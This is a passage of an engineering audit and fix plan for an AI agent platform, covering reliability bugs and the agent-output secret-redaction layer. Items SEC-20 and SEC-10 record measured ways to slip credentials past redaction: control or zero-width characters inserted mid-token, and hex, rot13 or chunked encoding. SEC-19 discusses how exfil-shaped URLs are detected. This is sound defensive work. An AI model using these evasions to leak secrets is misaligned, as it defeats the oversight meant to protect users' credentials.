- **Sources:** verify_needed:G15(#17041), verify_needed:G37

### SEC-19 [25, default, effort M] redact() now keeps {token} and <token>; still redacts $TOKEN, %s and any 200+ char query — PARTLY

> **COMPLETED** — decided (delegated): keep the documented token_parameter residual and the `exfil_query_length` heuristic as-is; narrowing without measured FP/FN data is a guess, and the residual is already documented in code. No code change.
- **Original claim:** Redaction false positives mangle legitimate content (corrected below)
- **Verified claim:** Measured with security.redact(). The token_parameter false positive on template placeholders is mostly fixed at HEAD: `?token={token}`, `?token={{ api_token }}` and `?token=<your-token>` are kept, because _TOKEN_PARAM_VALUE_CLASS excludes `{}<>`, backtick and `\|\^`. Three shapes still redact, documented as an 'ACCEPTED RESIDUAL': `?token=$TOKEN`, `?token=%s` and `?token=YOUR_TOKEN_HERE`, all made of legal query bytes. exfil_query_length still redacts any URL whose query is 200 chars or more, whatever the host. A Google Maps directions URL and a GitHub search URL both became '[REDACTED: suspicious URL to <host>]'. The code deliberately forbids per-shape waivers and says to 'narrow or replace this heuristic for EVERY host on its own merits'. Both rules mangle legitimate content that reaches model context and surfaces, at a security trade-off the code records.
- **Evidence (at `397f4be`):**
  - src/kiro_crew/security/redaction.py:1300-1338 — value class excludes RFC 3986-forbidden bytes so `?token={token}` / `<your-token>` do not match; 'ACCEPTED RESIDUAL: ... `?token=$TOKEN`, `?token=%s` still matches and is redacted'
  - src/kiro_crew/security/redaction.py:1888-1897 — pass 4 `token_parameter`
  - src/kiro_crew/security/exfil.py:88 `_EXFIL_QUERY_MIN_LEN = 200`; :1010-1043 — 'NO per-shape waiver on this gate, deliberately ... narrow or replace this heuristic for EVERY host on its own merits'
  - ran: kept — f-string ?token={token}, jinja ?token={{ api_token }}, prose ?token=<your-token>
  - ran: REDACTED — ?token=$TOKEN, ?token=%s, ?token=YOUR_TOKEN_HERE, 210-char-query Google Maps URL, 230-char-query GitHub search URL
- **Checked by:** ran-new-script
- **Required outcome:** DECISION NEEDED (security owner): how much false-positive cost the exfil_query_length heuristic may impose. Any narrowing must apply to every host on its merits (no per-shape or per-host waiver, per the code's recorded reasoning: model-authored URLs are attacker-steerable). For token_parameter, keep the documented residual unless the owner accepts a narrower value class. A shape test on the value reintroduces the false-negative lever the code warns about.
- **Solution:**
  1. Check upstream PR #17275 (state unverified). The brace/angle placeholder part appears already landed at HEAD.
  2. For exfil_query_length, present options to the owner: (a) score the query by encoded-payload evidence (entropy, percent-encoded binary, base64 runs) instead of raw length, with the same rule for every host; (b) raise _EXFIL_QUERY_MIN_LEN with measured FP/FN data; (c) keep as is and surface a 'link was redacted' affordance that lets the user see the URL locally without it entering model text.
  3. Whatever is chosen, keep test_redaction_mirror_parity.py::TestPrefilledIssueCarveOutParity green (no per-shape escape hatch).
  4. Consolidate the duplicate upstream issues (#17604/#17449/#17160 share one title).
- **Done when:** A characterization test table of legitimate URLs (Maps directions, GitHub search, docs deep links) and exfil-shaped URLs (base64/percent-encoded payload in a query) asserts the chosen policy: legitimate ones kept, exfil ones redacted, under one host-agnostic rule.
- **Upstream:** #17604 #17449 #17160 #17074 PR #17275 (state unverified)
- **Changed from the source claim:** Not code-checked in the source; now measured. The template-placeholder half (#17074 / PR #17275) appears fixed at HEAD for brace and angle forms. `$TOKEN`, `%s` and literal placeholders remain as a documented residual. exfil_query_length false positives are confirmed and deliberate. Severity assigned 25.
- **Second reader:** security-rules check: agreed.
- **Sources:** verify_needed:G15(redaction-FP), verify_needed:G37

### SEC-20 [25, default, effort M] Control-split credential/exfil tokens not redacted — CONFIRMED

> **COMPLETED** — covered by open upstream PR #14747 ("redact control-split credential and exfil tokens"; diff verified: `terminal_safe` fold-with-map redaction preserving byte fidelity); not duplicated.
- **Verified claim:** Measured with security.redact(). A ghp_ token and an AKIA access-key id are redacted when plain, but NOT when one character is inserted mid-token from any of: NUL, BEL, ESC, SOH, DEL, CR, an ANSI SGR sequence, ZERO WIDTH SPACE U+200B, ZERO WIDTH JOINER U+200D, SOFT HYPHEN U+00AD or BOM U+FEFF. A 300-char exfil-shaped URL split by NUL, ZWSP or ESC is not redacted either. The invisible code points (ZWSP, ZWJ, soft hyphen, BOM) make this different from SEC-10's encodings: the secret renders visually intact to a human on the dashboard or in a channel, and copy-paste may carry it whole. Upstream PR #14747 ('redact control-split credential/exfil tokens') is not reflected at HEAD.
- **Evidence (at `397f4be`):**
  - ran: ghp plain=R | NUL, BEL, ESC, SOH, DEL, ZWSP, ZWJ, SOFT HYPHEN, BOM, CR, ANSI SGR = not redacted
  - ran: AKIA plain=R | same 11 separators = not redacted
  - ran: exfil URL split by NUL / ZWSP / ESC = not redacted
  - src/kiro_crew/security/redaction.py — credential patterns match contiguous runs; no default-ignorable/control normalization pass found before matching
- **Checked by:** ran-new-script
- **Required outcome:** Redaction matches the text as it will be RENDERED and parsed. Default-ignorable code points (Cf: ZWSP, ZWJ, soft hyphen, BOM, etc.) and C0/C1 controls other than tab and newline are folded out of the matching subject, and matched spans map back to the original offsets so the whole split token, separators included, is replaced. This normalises the subject once; it is not a per-character pattern list.
- **Solution:**
  1. Check upstream PR #14747 (state unverified) and reuse it if it does this.
  2. In security/redaction.py's batch entry, build a folded view of the text (drop Unicode category Cf and C0/C1 controls except \t\n) with an index map back to the original. Run the existing credential and exfil passes on the folded view and replace the mapped original span.
  3. Make StreamRedactor's _CRED_CLASS treat the folded code points as in-run (non-terminating) so a split token is still held as one run.
  4. Measure false positives on the existing redaction corpus tests before landing.
- **Done when:** A parametrised unit test over separators {\x00, \x07, \x1b, \x7f, \r, \u200b, \u200d, \u00ad, \ufeff, '\x1b[0m'} and secrets {ghp_..., AKIA..., exfil URL}: redact() output contains no 12-char window of the secret, and the same text without the separator still redacts identically. A StreamRedactor variant at chunk sizes 1/7/64 gives the same result.
- **Upstream:** #12854 PR #14747 (state unverified)
- **Changed from the source claim:** Upstream-only in the source; now verified in code by measurement. Severity assigned 25 (output-boundary layer; invisible splits defeat redaction while still displaying the secret).
- **Second reader:** security-rules check: agreed.
- **Sources:** verify_needed:G37(#12854)

### REL-21 [25, armed, effort S] Claude Code executable resolution runs blocking `mise which` on the event loop — CONFIRMED

> **COMPLETED** — verified fixed on `main` by code read (no tests run): 70bacc934: acp/client.py now `await asyncio.to_thread(_resolve_claude_code_executable)`  
- **Verified claim:** When the selected backend is the Claude adapter and CLAUDE_CODE_EXECUTABLE is unset, the async AcpClient._spawn calls _resolve_claude_code_executable() synchronously on the event loop; that runs _mise_which, i.e. shutil.which('mise') and, if mise is installed, a blocking subprocess.run([mise, 'which', 'claude'], timeout=5), then shutil.which over the augmented PATH. Every Claude-backend spawn therefore stalls the whole gateway loop for the mise round-trip (bounded at 5 s per spawn), while the surrounding spawn steps are deliberately offloaded with asyncio.to_thread. Scope: armed (Claude backend selected, mise on PATH).
- **Evidence (at `397f4be`):**
  - src/kiro_crew/acp/client.py:7912 `async def _spawn(self)`; :8645-8651 — `if self._is_claude and not env.get("CLAUDE_CODE_EXECUTABLE"): ... claude_exe = _resolve_claude_code_executable()` (no to_thread)
  - src/kiro_crew/acp/client.py:2270-2299 _resolve_claude_code_executable — `mise_resolved = _mise_which(CLAUDE_CODE_BIN)` then `shutil.which(CLAUDE_CODE_BIN, path=search_path)`
  - src/kiro_crew/acp/client.py:972-995 _mise_which — `subprocess_mod.run([mise_bin, "which", tool], capture_output=True, text=True, timeout=5)`
  - src/kiro_crew/acp/client.py:7920-7934 — same _spawn offloads mkdir/prepare work: `await asyncio.to_thread(self._prepare_spawn_workspace)` ('the loop must never wait on the kernel here')
- **Checked by:** read
- **Required outcome:** Resolving the Claude executable never runs a subprocess or PATH walk on the gateway event loop; a Claude-backend spawn awaits it off-loop (and ideally caches the answer per process with invalidation on PATH/mise changes).
- **Solution:**
  1. acp/client.py:8650 — `claude_exe = await asyncio.to_thread(_resolve_claude_code_executable)`; if harness-parity H13 forbids a new await on the Kiro path, note this branch is Claude-only (self._is_claude) so the Kiro await count is unchanged — cite H13 in the PR.
  2. Optionally memoize the resolution (functools.lru_cache keyed on PATH + MISE_DATA_DIR) as _resolve_kiro_bin_async already does for kiro-cli.
  3. agent_sdk/drivers/acp.py:310 claude_components_resolve is a sync install-probe; confirm its callers are off-loop (backend_install.py:228).
- **Done when:** Test: patch acp.client._mise_which to record threading.get_ident() and return '/x/claude'; drive AcpClient._spawn for a Claude-backend client up to the env build (spawn itself stubbed) inside asyncio.run and assert the recorded thread id differs from the loop thread's.
- **Upstream:** #17077 (state unverified)
- **Changed from the source claim:** none (bounded at 5 s by the subprocess timeout; Claude-backend only)
- **Second reader:** random-sample check: agreed.
- **Sources:** verify_needed:G15(#17077), verification_needed:Part3(#17077)

### REL-27 [20, default, effort M] Transcripts rotate at 10 MB on append; dashboard whole-file save bounded only by 10k msgs — PARTLY
- **Original claim:** Session transcripts have no per-session size cap or rotation (corrected below)
- **Verified claim:** Session transcripts (~/.kiro/crew/sessions/{key}.jsonl) DO have rotation on the ConversationLog.append path: once a file passes _SESSION_MAX_BYTES = 10 MB it is rotated, keeping up to 200 lines (_SESSION_KEEP_LINES). The residual is the dashboard whole-file save (_save_slot_to_history / save_slot_off_loop), which the module itself documents as non-rotating: a transcript written only through it is bounded by the slot's message window (_MAX_SLOT_MESSAGES = 10,000 messages), not by bytes, and individual messages can be large (e.g. file_changes meta up to ~800K chars per turn), so such a .jsonl can still reach very large sizes. The cited pointer session_storage.py:2643 is _MANIFEST_RECORD_CAP (8 MiB) for snapshot/backup manifest records, not a transcript per-record cap.
- **Evidence (at `397f4be`):**
  - src/kiro_crew/history.py:1-7 module docstring — 'Appends through ConversationLog.append auto-rotate at 10MB, keeping up to 200 lines within that byte cap. The dashboard whole-file save does not rotate, so a transcript written only through it is bounded by its message window instead.'
  - src/kiro_crew/history.py:383-384 — `_SESSION_MAX_BYTES = 10 * 1024 * 1024`, `_SESSION_KEEP_LINES = 200`; :3896 _maybe_rotate
  - src/kiro_crew/dashboard/chat_persistence.py:2101 _save_slot_to_history, :2490 save_slot_off_loop (whole-file save)
  - src/kiro_crew/dashboard/state.py:1465 `_MAX_SLOT_MESSAGES = 10000 # Keep all messages`
  - src/kiro_crew/session_storage.py:2643 — `_MANIFEST_RECORD_CAP = 8 * 1024 * 1024` (manifest records, not transcripts)
- **Checked by:** read
- **Required outcome:** Every session transcript on disk has a byte bound: the dashboard whole-file save either rotates/archives older rows past a byte budget or stores large per-message payloads out of line, so a long-lived dashboard session's .jsonl cannot grow to many hundreds of MB.
- **Solution:**
  1. Decide the byte budget for dashboard-saved transcripts (record it in docs/system-specs/modules/history.md).
  2. In _save_slot_to_history (chat_persistence.py:2101), when the serialised transcript exceeds the budget, archive the oldest rows to a rotated sibling (reuse history._maybe_rotate's archive naming) while keeping the in-window rows; or move bulky meta (file_changes before/after, see REL-26) to side files referenced by id.
  3. This drops rows from the live file — a take-away change: add a Reader: entry per docs/system-specs/common/take-away-changes.md and keep rehydrate able to read the archive.
- **Done when:** Test: build a slot whose serialised transcript exceeds the budget (inject large assistant meta), call _save_slot_to_history to a tmp KIROCREW_HOME, assert the live .jsonl size <= budget, the archived rows exist in the rotated file, and rehydrate returns the in-window messages unchanged.
- **Upstream:** #15706 (state unverified)
- **Changed from the source claim:** Overstated: rotation exists (10 MB / 200 lines) on the append path; the unbounded-by-bytes case is the dashboard whole-file save, bounded by 10,000 messages. The 8 MiB pointer is the manifest-record cap, not a transcript cap.
- **Sources:** verify_needed:G29(#15706)

### REL-30 [20, default, effort M] commit_runtime_teardown refusal leaves no kill-owed debt; owner kills can leak the runtime — PARTLY
- **Original claim:** commit_teardown refusal leaks the abandoned runtime (corrected below)
- **Verified claim:** When commit_runtime_teardown refuses (a tenant claimed the pid after the kill gate allowed it, or a claim arrived and left since the verdict's epoch), every killer abandons the kill and returns: session_pid._commit_teardown logs WARNING 'ABANDONING the authorized kill ... the next drain revisits it', and the reconciler's _reclaim_one returns a reason string. Unlike a tenancy refusal at the gate (RuntimeTenancy.refuse_for_tenants, which marks the live claims `owed` so the last tenant out is handed the runtime back), a commit-time refusal records NO kill-owed debt, so reclamation depends on some later drain re-finding the process. For an owner-initiated provider kill (_sync_kill_provider: cancel paths, warm-pool discard, allocation failure) whose owner has already let go, no specific revisit was found, so the runtime can outlive every record and fall to the report-only untracked arm (REL-28). Exposure is narrow while every runtime serves one session (cap=1), since only a racing claim on the same pid triggers it.
- **Evidence (at `397f4be`):**
  - src/kiro_crew/runtime_ownership.py:755-791 commit_teardown — returns False on a live claim or `self._epochs.get(pid, 0) != epoch`; docstring: 'one deferred teardown -- the next drain revisits it'; no debt written
  - src/kiro_crew/runtime_ownership.py:707-735 refuse_for_tenants — `for claim in live: claim.owed = True` (the debt is recorded only on this gate-time path)
  - src/kiro_crew/session_pid.py:3454-3476 _commit_teardown — WARNING 'ABANDONING the authorized kill of pid %d ... the next drain revisits it'; callers :2451 (Windows) and :2535 (POSIX) `if not _commit_teardown(pid, tenancy_token): return`
  - src/kiro_crew/runtime_reconcile.py:944-948 _reclaim_one — `if not self._commit_teardown(pid, epoch): return "a tenant claimed the process after the gate allowed it"`
  - docs/system-specs/modules/runtime-ownership.md:205-231 'Kill owed, and the hand-back' + 'the kill is abandoned'; :567+ Known gaps: 'cap is not open ... every runtime serves one session'
- **Checked by:** read
- **Required outcome:** A kill abandoned at commit time is never lost: either the claim that caused the refusal carries a kill-owed debt (so its release hands the runtime back), or the runtime is put on a revisit list that the next cleanup tick re-drives through the same gate.
- **Solution:**
  1. Read docs/system-specs/modules/runtime-ownership.md first. 1. In RuntimeTenancy.commit_teardown (runtime_ownership.py:755), when refusing because a claim is live, mark those claims owed in the same critical section (the refuse_for_tenants shape) so kill_owed_handback fires on their release. 2. When refusing on an epoch change with no live claim, return a distinct reason so the caller can re-queue the kill (e.g. add the pid+start-identity to a bounded 'kill owed' set the cleanup tick drains via the gate). 3. Update the spec's 'Kill owed' section in the same commit, and extend test_runtime_ownership.py.
- **Done when:** Unit test in test_runtime_ownership.py: authorize a kill (epoch e), take a claim on the pid, call commit_teardown(pid, e) -> False, then release the claim and assert the release returns the runtime for hand-back (kill_owed_handback path); second test: claim+release between verdict and commit, assert the pid lands on the owed set and the next drain re-drives it.
- **Upstream:** #14637 (state unverified)
- **Changed from the source claim:** Mechanism holds (no debt on commit-time refusal); severity depends on a race that cap=1 makes rare, and the code's own claim that 'the next drain revisits it' is not backed by a specific revisit for owner-initiated kills.
- **Sources:** verify_needed:G30(#14637)

### REL-34 [20, default, effort S] Judge, task-refine and hook-run work folders never reclaimed; eval folders are cleaned — PARTLY

> **COMPLETED** — verified fixed on `main` by code read (no tests run): 956e973f3: judge, task-refine and hook-run session keys are now fresh per call and classified disposable in session_work_dir.py   Eval folders were already cleaned
- **Original claim:** Judge/task-refine/hook/eval run folders never reclaimed (corrected below)
- **Verified claim:** Confirmed for judges, task-refine and hook runs; not for evals. Each one-run LLM call that keys a fresh session — the decision judge (`judge-<uuid4>`), task refine (`taskrunner:refine:<ms>`), the dashboard hook test/default run (`hook:default:<epoch>`) — gets its own derived work directory workspace_root()/<safe key> (judge-<hex>, taskrunner_refine_<ms>, hook_default_<epoch>). The only reclaim machinery (session_work_dir: provider shutdown reclaim + hourly predecessor sweep) acts solely on directories marked disposable, and is_disposable_session_key accepts only subagent:, stateless cron:<job>:<run> and memory-consolidation: shapes, so these directories are never marked, never reclaimed, and not even counted by the doctor's DERIVED_NAME_RE census. Evals are the exception: eval/runner.py runs inside tempfile.TemporaryDirectory(prefix='kirocrew_eval_'), which is removed on exit.
- **Evidence (at `397f4be`):**
  - src/kiro_crew/session_work_dir.py:127-132 _DERIVED_SESSION_SHAPES — only ('subagent',..), ('cron', hex8, hex8), (memory-consolidation, store, hex32); :168 is_disposable_session_key
  - src/kiro_crew/config/loader.py:4593 `wdir = Path(cwd) if cwd else _session_work_dir(session_key)`; :854-859 `return root / _safe_dir_name(session_key)`; :4735 `disposable_work_dir=not cwd and is_disposable_session_key(session_key)`
  - src/kiro_crew/decisions/impl_llm.py:206 `key = f"judge-{uuid.uuid4().hex}"`; src/kiro_crew/dashboard/handlers/taskrunner.py:1158 `session_key = f"taskrunner:refine:{int(_time.time() * 1000)}"`; src/kiro_crew/dashboard/handlers/hooks.py:957 `session_key = f"hook:default:{int(time.time())}"`
  - ran rel34_keys.py: subagent/cron-run/memory-consolidation disposable=True; judge-<hex> False (dir judge-e559…), taskrunner:refine False (dir taskrunner_refine_<ms>), hook:default False (dir hook_default_<epoch>)
  - src/kiro_crew/eval/runner.py:249 `with tempfile.TemporaryDirectory(prefix="kirocrew_eval_") as tmp:`
- **Checked by:** ran-new-script
- **Required outcome:** Every one-run session Crew creates for an internal LLM call (judge, task refine, hook run) gets a disposable, marked work directory that the existing shutdown reclaim and predecessor sweep remove, and pre-existing leftovers are at least counted by the doctor.
- **Solution:**
  1. Prefer key shapes the reclaim already understands, or extend _DERIVED_SESSION_SHAPES (session_work_dir.py:127) with ('judge', hex32), ('taskrunner:refine'-style → use a hex id instead of a millisecond stamp) and ('hook', name, hex) — the table drives both the key predicate and the directory-name filter, so they cannot diverge.
  2. Change taskrunner.py:1158 and hooks.py:957 to append a uuid hex rather than a timestamp so the shape is unambiguous.
  3. Alternatively pass an explicit temporary cwd for these calls (as eval does).
  4. Update docs/system-specs/modules/session.md (work-dir reclaim) in the same commit; reclaim stays residue-only (rmdir on non-empty fails), so no user file is at risk.
- **Done when:** Unit tests: is_disposable_session_key('judge-'+uuid4().hex) and the new refine/hook key shapes return True and DERIVED_NAME_RE matches their dir names; an integration-style test creates the provider for a judge key on a tmp KIROCREW_HOME, starts and shuts it down with the client stubbed, and asserts the work directory is gone.
- **Upstream:** #16049 (state unverified)
- **Changed from the source claim:** Evals do clean up (TemporaryDirectory); judges, task-refine and hook runs do not.
- **Sources:** verify_needed:G25(#16049)

### REL-42 [20, default, effort L] Backend god-files exceed review scale; orchestration lives in prose — CONFIRMED
- **Verified claim:** Measured at HEAD, every listed size is exact: dashboard/chat_runner.py 19,067 lines; acp/client.py 14,967; sandbox.py 13,776; acp/runtime.py 8,666; acp/session_handle.py 7,036; agent.py 5,556; hooks.py 3,337; builtin_skills/pipeline-conductor/SKILL.md 105,481 bytes. The list omits slack/gateway.py (14,294 lines, third largest), dashboard/chat_handlers.py (11,211), dashboard/state.py (10,801) and platform_compat.py (10,676). The conductor's plan->execute->verify loop has no code state machine: SKILL.md is 'the procedure of record'; five bundled scripts (claim_preflight, fleet_probe, credit_spend, spec_check, coverage_filter) carry only the deterministic bookkeeping. Splitting files or adding a conductor FSM is a maintainer design decision, not a defect fix.
- **Evidence (at `397f4be`):**
  - wc (rel42_43_measure.py): chat_runner.py 19067, acp/client.py 14967, slack/gateway.py 14294, sandbox.py 13776, dashboard/chat_handlers.py 11211, dashboard/state.py 10801, platform_compat.py 10676, acp/runtime.py 8666, acp/session_handle.py 7036, agent.py 5556, hooks.py 3337
  - src/kiro_crew/builtin_skills/pipeline-conductor/SKILL.md — 105481 bytes
  - docs/system-specs/modules/pipeline-conductor.md:18-21 — 'the pipeline-conductor builtin skill carries the operating procedure, five bundled scripts carry the bookkeeping, and the agent carries the judgment. The skill is the procedure of record'
  - src/kiro_crew/builtin_skills/pipeline-conductor/scripts/{claim_preflight,coverage_filter,credit_spend,fleet_probe,spec_check}.py — the only code counterpart
- **Checked by:** ran-new-script
- **Required outcome:** A maintainer decision on (a) whether/where to split the >10k-line modules along existing seams and (b) whether the conductor's state transitions and ceilings move into a code FSM with the skill keeping only per-state guidance; until then no behaviour change is owed.
- **Solution:**
  1. Record the decision under docs/decisions/ (grep it first per AGENTS.md).
  2. If split is approved: extract chat_runner.py along its existing seams (recovery, routing, streaming) one PR per seam, each moving code without behaviour change and keeping the module's public names re-exported; same for acp/client.py along AcpRuntimeProtocol/CompactionDeps.
  3. If a conductor FSM is approved: add a small transitions table + ceiling checks under builtin_skills/pipeline-conductor/scripts/ (the existing deterministic half) and pin it in docs/system-specs/modules/pipeline-conductor.md.
  4. Each step updates the owning spec in the same commit.
- **Done when:** Decision entry exists in docs/decisions/; for any approved split, a ratchet test pins max line count per extracted module and the existing test suites for chat_runner/acp.client pass unchanged.
- **Changed from the source claim:** Numbers exact at HEAD; the list missed slack/gateway.py (14,294) and three other >10k files; the conductor has a deterministic script half but no code FSM.
- **Sources:** verify_needed:A13, verification_needed:crit-risk-2, verification_needed:refactor(chat_runner-split)

### REL-44 [20, default, effort S] importlib.reload replaces shutdown_event — CONFIRMED

> **COMPLETED** — verified fixed on `main` by code read (no tests run): c03dfc2a4: gateway reads version from disk instead of importlib.reload(kiro_crew); no kiro_crew reload remains (only app-module reloads in apps/backend.py, registry.py)  
- **Verified claim:** The git auto-update path (_auto_apply_update, only when KIROCREW_PROJECT_DIR is set, i.e. a source checkout) calls importlib.reload(kiro_crew) just to read the new __version__. Reloading re-executes kiro_crew/__init__.py, which rebinds kiro_crew.shutdown_event to a fresh _LazyShutdownEvent. The SIGTERM/SIGINT handler and every module imported before the reload hold the OLD object, so after the reload a signal sets only the old event: the /readyz handler (reads kiro_crew.shutdown_event attribute-style) keeps advertising ready during a graceful stop, and any module first imported after the reload binds the new event and never sees the signal. This matters when the restart is then deferred (drain timeout / no usable interpreter) and the process keeps serving on reloaded state.
- **Evidence (at `397f4be`):**
  - src/kiro_crew/slack/gateway.py:12633 — `importlib.reload(kiro_crew)` inside _auto_apply_update (:11836), followed by `new_ver = kiro_crew.__version__`
  - src/kiro_crew/__init__.py:208 — `shutdown_event: _LazyShutdownEvent = _LazyShutdownEvent()` (module-level, re-created on reload)
  - src/kiro_crew/slack/gateway.py:66 imports `shutdown_event` by name; :13500 signal handler `_on_signal` -> `shutdown_event.set()` (the import-time object)
  - src/kiro_crew/dashboard/handlers/core.py:574 — readiness gate `shutting_down = kiro_crew.shutdown_event.is_set()` (attribute lookup -> the NEW object)
  - src/kiro_crew/slack/gateway.py:11382-11386 — restart can be deferred ('restart deferred: callback/refusal work did not drain'), so the process keeps running after the reload
  - ran rel44_reload.py: 'same object after reload: False'; after old.set(): 'kiro_crew.shutdown_event.is_set(): False'; a late `from kiro_crew import shutdown_event` gets the new, unset object
- **Checked by:** ran-new-script
- **Required outcome:** Reading the post-update version never re-executes a module that owns process-wide singletons; after an auto-update (restarted or deferred) one shutdown_event object is seen by the signal handler, /readyz and every later importer.
- **Solution:**
  1. Replace `importlib.reload(kiro_crew)` at slack/gateway.py:12633 with a read that does not execute the package: e.g. importlib.metadata.version('kiro-crew') after the pip install, or parse __version__ from the new kiro_crew/__init__.py text (ast.literal_eval on the assignment), or run `python -c 'import kiro_crew; print(kiro_crew.__version__)'` in the subprocess the update already spawns.
  2. Optionally make __init__.py idempotent under reload (`shutdown_event = globals().get('shutdown_event') or _LazyShutdownEvent()`), the same guard apps/backend.py:66 and apps/registry.py:58 document for their own reload hazard.
  3. Add a guard test that no src module calls importlib.reload on kiro_crew.
- **Done when:** Test: capture `from kiro_crew import shutdown_event as old`, run the version-read helper that replaces the reload (with the project tree pointed at a tmp copy whose __init__ declares a new __version__), assert the helper returns the new version and `kiro_crew.shutdown_event is old`; plus an rg-style test asserting 'importlib.reload(kiro_crew)' does not occur under src/kiro_crew.
- **Upstream:** #17085 (state unverified)
- **Changed from the source claim:** Scoped: only the source-checkout auto-update path reaches the reload; the signal handler itself still sets the event most modules hold, so the miss is for /readyz and post-reload importers rather than for the whole gateway.
- **Second reader:** random-sample check: agreed.
- **Sources:** verification_needed:Part3(#17085)

### REL-7 [20, default, effort S] File watch never reconnects after a connection drop — CONFIRMED

> **COMPLETED** — verified fixed on `main` by code read (no tests run): ac2eb6bb2: useFileWatch.ts reconnects with backoff after transient drops (EventSource onerror path, reconnect 1 s doubling to 30 s)  
- **Verified claim:** useFileWatch closes the EventSource on any onerror and sets status 'error'. It re-subscribes only when the filePath argument changes. Its only consumer, MarkdownPanel, passes `watchArmable && active ? filePath : null`, so a gateway restart, laptop sleep or network drop stops live updates of the visible file tab until the user switches tabs or reopens the file. The close-on-error is deliberate, to stop EventSource auto-reconnecting against a 404 for a directory or missing path. The hook cannot tell that case apart from a transient drop.
- **Evidence (at `397f4be`):**
  - website/src/hooks/useFileWatch.ts:35-47 — `es.onerror = () => { ... es.close(); esRef.current = null; setStatus('error') }`
  - website/src/hooks/useFileWatch.ts:36-43 — comment: transient drop 're-subscribes when filePath changes'
  - website/src/components/MarkdownPanel.tsx:1789-1790 — `useFileWatch(watchArmable && active ? filePath : null, ...)` (only consumer)
  - website/src/components/MarkdownPanel.tsx:1783-1787 — the missing-file retry covers 404, not a transient drop on an existing file
- **Checked by:** read
- **Required outcome:** A transient stream drop on an existing file re-subscribes automatically with bounded backoff. A 404 (missing path or directory) stays terminal, with no reconnect loop. Cleanup on unmount or path change cancels any pending retry.
- **Solution:**
  1. In website/src/hooks/useFileWatch.ts:35-47, on error close the stream and classify the failure. Either probe once (a HEAD/GET of the same URL, or the existing file-read endpoint) and treat 404 as terminal, or have the backend api_file_watch send a terminal SSE event before closing for a missing path, and stop on that event.
  2. Otherwise schedule a reconnect with capped exponential backoff (for example 1 s doubling to 30 s), resetting the attempt counter on onopen.
  3. Clear the timer in the effect cleanup.
  4. Keep the 'error' status for the terminal case only.
- **Done when:** Vitest with a controllable EventSource double (the seam website/src/hooks/useFileWatch.test.ts already uses) and fake timers restored in afterEach. Firing onerror with the probe answering 200 opens a new EventSource after advancing timers by the first backoff step. Answering 404 opens none, and status is 'error'. Unmounting during the backoff opens none.
- **Changed from the source claim:** Severity 25 -> 20: recovery happens on a tab switch or reopen, and MarkdownPanel arms the watch only for the visible clean tab. HEAD lines unchanged.
- **Sources:** FIX_PLAN:REL-7, REVIEW_FINDINGS:Part1#10

### SEC-10 [20, default, effort S] Output redaction is shape-based; hex/rot13/chunked emission evades it — CONFIRMED

> **COMPLETED (doc part)** — `b291147` (`docs/matcher-residuals`): "What redaction does not cover" lands in security.md's XPIA section, pointing at the sandbox tier, env scrub and exfil gate; no encoded-shape heuristics added (the item's own recommendation).
- **Verified claim:** Measured with security.redact(). A plain `aws_secret_access_key = ...` line and a plain ghp_ token are redacted, and so is a base64-encoded key=value line ('[REDACTED: encoded credential]'). The same secrets hex-encoded, rot13'd, split into 8-character lines, or space-separated pass through unchanged. This is inherent to shape-based redaction and is consistent with how the project positions it: an output-boundary defense in depth, with the OS sandbox tier, the env scrub and the exfil gate as the controls. A secret the agent can read (SEC-5/SEC-6) can be re-encoded by the agent at will.
- **Evidence (at `397f4be`):**
  - ran: plain key=value -> [REDACTED: credential]; plain ghp_ token -> redacted; base64(key=value) -> [REDACTED: encoded credential]
  - ran: hex(secret), hex(ghp), rot13(ghp), 8-char-chunked ghp, space-separated ghp -> not redacted
  - src/kiro_crew/security/redaction.py — shape catalogue (PEM/JWT/token/URL userinfo) plus entropy pass
  - docs/system-specs/modules/security.md:563 threat-model row — 'output redaction remains defense in depth'
- **Checked by:** ran-new-script
- **Required outcome:** DECISION / accepted residual, framed at the subject and the OS layer, not at more redaction shapes. Redaction is documented as a best-effort output filter that a deliberately encoding agent defeats by construction. The controls for an agent that can read a secret are the sandbox tier (SEC-5), the env scrub (SEC-6) and the exfil gate. No hex/rot13/chunk heuristics are added, which would be the same spelling-chase AGENTS.md rejects for matchers (each encoding closed narrows an unbounded set by one, at a false-positive cost; see SEC-19).
- **Solution:**
  1. Add a short 'What redaction does not cover' paragraph to security.md's XPIA Hardening section (around 863), listing encoded and chunked emission and pointing at SEC-5/SEC-6.
  2. No code change. Any new detector requires an owner decision weighed against the false-positive class already open (SEC-19).
- **Done when:** The security.md paragraph exists. Optionally, a characterization test pins that hex/rot13 are NOT redacted, so a future change to that behaviour is a deliberate, reviewed decision.
- **Changed from the source claim:** Verified by running redact() (the source was [VERIFY]). Base64 IS handled. Hex, rot13, chunked and spaced are not. Severity assigned 20 (residual of a defense-in-depth layer).
- **Second reader:** security-rules check: agreed.
- **Sources:** verification_needed:V-6

### SEC-15 [20, default, effort M] MCP identity now per session via signed tokens; tokenless stub connections still per PID — PARTLY

> **COMPLETED** — covered by open upstream PR #17524 ("stop answering MCP identity per process on a runtime hosting several sessions"; diff verified: `_apply_claim`/`identity.py` hunks + the tokenless-connection tests); not duplicated.
- **Original claim:** MCP session identity answered per process on shared runtimes (corrected below)
- **Verified claim:** Largely superseded at HEAD, with a narrow residual. _resolve_session_key_strict now prefers (0) the gateway-injected per-call caller context and (1) a signed per-SESSION token. The token is minted unconditionally for every session on a shared AcpRuntime (acp/runtime.py:6822) and resolved through a MAC-signed mapping, above the env var. (3) the host-pid sidecar refuses a pid hosting several sessions. In gatewayd, a token-carrying stub resolves to its own token's session and fails closed on an unclaimed or mismatched token ('every process-tree source left answers per RUNTIME'). The process-tree walk (peer_resolve.resolve_peer_identity) returns '' for a multi-session pid. What still answers per process: a TOKENLESS stub connection. A claim with no token re-targets every connection under the PID, and a token-carrying claim also re-targets tokenless connections (daemon/control.py:167-173; claim.py:118-121; session_provider.py:915-919 'Empty ... falls back to the PID-wide re-target'). Per the code comments this covers older sessions, stubs that predate the token, and runtimes where the gateway injected no stubs. Whether any default-install connection is still tokenless on a multi-session runtime cannot be checked here.
- **Evidence (at `397f4be`):**
  - src/kiro_crew/mcp_core.py:663-738 _resolve_session_key_strict — order: current_caller(); _session_key_from_token(); KIROCREW_SESSION_KEY; verify_session_pid(host_pid)
  - src/kiro_crew/acp/runtime.py:6802-6833 — 'Minted UNCONDITIONALLY'; `token = mint_stub_session_token()`; claim sent with the token before session/new
  - src/kiro_crew/mcp_gateway/daemon/identity.py:458-486 — token_caller first; `elif stub_session_token:` fail closed ('every process-tree source left answers per RUNTIME, and one runtime hosts many sessions')
